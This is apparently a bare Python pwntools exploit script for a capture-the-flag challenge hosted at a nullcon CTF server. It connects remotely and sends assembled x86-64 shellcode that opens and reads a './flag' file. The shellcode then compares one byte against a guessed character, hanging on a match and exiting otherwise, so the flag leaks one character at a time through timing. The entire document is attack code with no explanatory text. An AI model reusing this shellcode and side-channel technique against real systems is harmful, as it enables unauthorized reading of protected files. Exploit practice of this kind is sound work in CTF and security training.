from pwn import *
#io=process("./chall")
#gdb.attach(io,"b child_do")
import time
from string import printable as sp


context.arch="amd64"
while True:
    for j in sp:
        io=remote("pwn1.ctf.nullcon.net",5002)

        shell=asm("""
                xor rax, rax
                push rax
                mov r9,0x67616c662f2e
                push r9
                mov rdi, rsp
                xor esi, esi
                xor edx, edx
                mov al, 0x2
                syscall

                mov rdi,rax
                xor rax,rax
                mov rsi,0x6010f8
                mov dl,0x50
                syscall


                cmp byte ptr [rsi+{}],{}
                jne exit

                loop:jmp loop

                exit:xor eax,eax
                mov al,0x60
                xor rdi,rdi
                syscall

        """.format(sys.argv[1],ord(j)))
        print "checking "+j+" at " +str(sys.argv[1])

        io.send(shell)
        io.interactive()
